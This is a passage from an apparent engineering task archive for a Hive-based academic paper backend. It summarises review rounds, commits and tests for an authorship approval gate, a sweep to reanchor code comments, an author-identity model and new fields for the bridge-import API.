boundary, not stubbed), asserting `ap.approver IN (ap.paper_author, $18)` appears EXACTLY TWICE (the Explicitly-approved EXISTS arm + the revoke-override `MAX(approve_block)` subquery) — a predicate removal drops count to 1 → red, a bridge-param drift drops to 0 → red. Round-2 hold (P2 the new canary file's header introduced a fresh `§2.10` schema-section anchor — the exact rot class the sibling anchor-rot-sweep exists to eliminate). Round-3 (commit `028c3761`, single-prefix-drop) removed the `§2.10` qualifier, anchoring on the op-action string `approve_authorship`. Round-3 `/ce-code-review` (5 personas): CLEAN. The `§2.10` was the file's sole `§ N.N` occurrence; replacement uses only stable symbols (`computeReputationBatch`, `accepted_claims`, `authorshipClaimsCteBody`); no slug/SHA/line/round-N anchor introduced. Notification `claim_approved`/`claim_pending` arms intentionally left ungated (nuisance-spam only, no trust grant). Cross-refs: `backend-anchor-rot-sweep-2026-05-21` (Cluster C reanchored adjacent `§ N.M` citations in production source).

---

## BACKEND-ANCHOR-ROT-SWEEP-2026-05-21 (archived 2026-05-30) — Cluster-C round-3 re-review clean ✓

Two unrelated convention-rot clusters surfaced during the 2026-05-21 review batch: Cluster A (migration files 005/006/007 with task-slug leading-title prefixes) and Cluster B (sibling rot in `hafsql.test.ts`: line-number anchors, round-N hold-block citations, soft slug-shaped redirects). Clusters A+B landed in commit `47009e53` (rewrote migration leading titles onto behavioral form; swept `hafsql.test.ts` to zero hits per the acceptance grep); round-2 hold item axis-5 docblock contract correction (an inverted "admitted" → "excluded" claim for case-different co-author exclusion via `LOWER(TRIM(...))` + charset regex normalization) landed in commit `b580a3f4`. Round-2 architect addition surfaced Cluster C: the sibling `backend-approve-authorship-signer-gate` review's `§ 2.10`/`§ 2.11` schema-section citations across `authorshipClaimsCteBody` + `computeReputationBatch`'s `accepted_claims` + the new behavioral regression test — schema section numbers renumber on doc restructure exactly like line numbers do, so per CLAUDE.md "Comment anchors" they are rot-prone; the durable anchor is the op's `custom_json` action string. Round-3 (commit `9bea1e53`) reanchored every authorship signer-gate `§ N.M` citation onto the op `action` strings (`claim_authorship` / `approve_authorship` / `revoke_authorship`); preserved each behavioral statement (approve is valid only when signed by post author or bridge; revoke is signer-permissive — the claimer may self-revoke); left exactly 3 `§ 1.1` "Canonical SQL pattern" hits in `authorsWithSupersessionSelect` per the explicit escape-hatch in acceptance item 3 (coupled to the pending `architect-cumulative-union-doc-edits` doc rewrite — they cite a section TITLE not a bare number, and are added to the convention by default on next touch). Round-3 `/ce-code-review` (5 personas): CLEAN. Acceptance grep returns zero new `§ N.N` hits in the touched regions; the 3 retained hits are out of Cluster C's named scope; correctness verified each behavioral claim against the actual SQL (the `approve_authorship` gate `ap.approver IN (ap.paper_author, $bridgeIdx)` mirrored across `hafsql.ts` and `reputation.ts` `$18` × 2; revoke arm intentionally permissive matching the `revocations` CTE projection); cross-file mirror comments use the same op-action anchor style. Cross-refs: `convention-enforcing-fix-must-audit-its-own-new-code-2026-05-17.md`, `comment-sweep-expansion-must-audit-added-clause-behavioral-accuracy-2026-05-20.md`, `docblock-anchor-stable-symbols-not-line-numbers-2026-05-15.md`.

---

## BACKEND-AUTHOR-IDENTITY-MODEL (archived 2026-05-30) — round-5 re-review clean ✓

P1 structural gaps in the author-identity model rooted at the cumulative-union construction (`buildCumulativeAuthorsForChain`) and the shared supersession projection: (1) Hive-less co-authors structurally dropped on multi-link papers — the cumulative-union dedups on `hive` and skips entries without a normalizable Hive account, violating the "authors can't be dropped" invariant for `{name, hive: null}` co-authors that appear in some broadcaster's `authors[]`; (2) no name-supersession — accredited author's attested `researcher_name` should win over broadcaster-claimed name, mirroring ORCID supersession. Plus type-soundness gap: `PaperAuthor.name` was required but construction emitted entries with no name guarded by an unsound `as unknown as PaperAuthor` cast on hive-string only. Ratified model (from `/ce-brainstorm`): `name` mandatory; `hive` optional; no grandfathered posts (clean cutover); name-supersession is silent (no `name_discrepancy` field — name variation is benign noise unlike ORCID mismatch). R1-R4 landed (commits `fb576c0c` + `aae3009a`): composite-key Hive-less track in cumulative-union (orcid / name dedup, two tracks never auto-merge — that's the bridge-author-claim-attestation flow's responsibility), name-supersession in `applyAuthorSupersession` + `authorsWithSupersessionSelect`, mandatory-name with read-time fallback (attested → broadcaster → hive → orcid), sound `typeof a.name === 'string'` guard replacing the cast. Round-1 hold (3 items: R3 incomplete on `?version=N` + `metadata_restored` paths; SQL/JS BTRIM divergence on whitespace-only attested names; degenerate-entry SQL/JS shape divergence). Round-2 (commit `5517f8ca`) landed all three with BTRIM dropped on the JS side (charset-free exact-empty test matching the SQL arm) and a degenerate-drop WHERE on `authorsWithSupersessionSelect`. Round-2 hold (P0 RED test — round-2's SQL degenerate-drop broke the pre-existing `authorsWithSupersessionSelect SRF cascade-fail defense` test, uncaught by round-2 verification; sound `name` guard still unmet on two `papers.ts` branches; item-2/3 fixes unpinned). Round-3 (commit `8e0cbfc1`) moved the soundness filter into the shared `applyAuthorSupersession` helper (all 3 consumers — `toPaperSummary`, `?version=N`, `metadata_restored` — inherit without re-guarding), fixed the RED test, added real-Postgres loader-whitespace test + degenerate-drop canary, de-coupled the brittle full-WHERE regex. Round-3 hold (P2 direct unit test for the load-bearing name-soundness `.filter` was missing; P2 stale `PaperAuthor.orcid_verified` docstring in `domain.ts` describing non-object branch projecting `{orcid_verified, orcid_discrepancy}` for every output, now contradicted by the drop). Round-4 (commit `239a2ae0`) added 2 direct unit tests in `papers-canonical-orcid-resolution.test.ts` (`applyAuthorSupersession([{affiliation:'x'}, {name:'Alice', hive:'alice'}], new Map(), new Map())` → length 1; non-object + named-entry case → length 1; mutation-kill confirmed by commenting out the `.filter` line) and reworded the `orcid_verified` docstring anchored on `applyAuthorSupersession` (no new §/slug/SHA/line/round-N anchor introduced). Round-4 `/ce-code-review` (5 personas): CLEAN. Correctness traced both mutation-kill claims against the actual `.filter` at `author-supersession.ts`; pre-existing `§ 1.1`/`§ 2` anchors in `domain.ts` correctly left untouched (belong to anchor-rot-sweep scope); test fixtures use deliberately-degenerate entries (`{affiliation:'x'}`, `null`, `'alice'`) that exercise the drop path. Architect-owned doc edits (`hive-schemas.md § 1.1` name-supersession rule, `api-contracts/papers.md` mandatory-`name` + nameless-drop invariant, `ARCHITECTURE.md § 2` Hive-less display-only persistence note) remain deferred to `architect-cumulative-union-doc-edits` (blocked). Cross-refs: `tests-must-fail-on-mutation-of-code-under-test-2026-04-22.md`, `mutation-kill-claims-must-match-assertion-and-corpus-2026-05-15.md`, `comment-sweep-expansion-must-audit-added-clause-behavioral-accuracy-2026-05-20.md`.

---

## BACKEND-BRIDGE-IMPORTS-ENTRY-ENRICH (archived 2026-05-28) — round-1 re-review clean ✓

P2: the "My imports" surface (`GET /api/bridge/imports` → `BridgeImportListResult`) lacked three fields the UI needed — `title` (rows fell back to the raw identifier), `eta_seconds` (every pending row showed "ETA unknown"), and a resolved `author` for fresh broadcasts (only `existing_author` was set on a permlink-collision short-circuit, so "View paper" was suppressed for the common fresh-broadcast case). Masked during UI dev because `?demo=1` injected synthetic fields the real wire shape lacked. Implementation: R1 persists the register-time preprint `title` on the queue row (`null` only if metadata had not resolved at enqueue); R2 emits per-non-terminal `eta_seconds` reusing the 202-path `etaSecondsForPosition` derivation (position 1 → 0), `null` for terminal entries; R3 emits resolved `author` (the `HIVE_BRIDGE_ACCOUNT` post author once `completed`, equal to `existing_author` on collision, `null` while non-terminal) so the SPA builds the completed-post link without injecting the bridge account into frontend config. Migration 015: textbook-safe additive nullable column. Round-1 hold (two P2 testing-assertion gaps tied to the task's own acceptance) landed: the collision entry now asserts `title === TITLE` (collision-path serialization regression caught), and the pending entry's `eta_seconds` is pinned `=== 0` (replacing a `typeof`/`>= 0` pair), pinning both the position-1 `queue_position` correlated subquery and the formula, matching the 202 path. Round-2 `/ce-code-review` (testing + correctness): round-1 items confirmed sound. One disputed P2 (C1) DISMISSED — correctness flagged the `=== 0` pin as a theoretical cross-file flake via the global (un-username-filtered) `queue_position` subquery; testing judged it low/pre-existing. Dismissed as preemptive flake-hardening: the pin was architect-requested at round 1, the sibling 202-path assertion carries the identical global-rank coupling and has been stable, the implementer empirically validated it in a parallel batch, and the second-pending-row position-2 case was correctly NOT added for exactly this global-rank risk. Architect-owned `bridge.md` doc edits (202 example lists title/author/eta_seconds; terminal `failed` → null author) landed at round 1. Dismissed P3 advisories: persisted-vs-live bridge account (single-instance stable config), unbounded external-metadata title length (beta hardening), `in_progress` non-zero ETA (best-effort by design), missing `(state, id)` covering index (beta-scale fine). UI consumer wiring (View-paper link for all completed entries, per-row ETA, title labels) is the held `ui-bridge-import-queue-ux` task, gated on this.

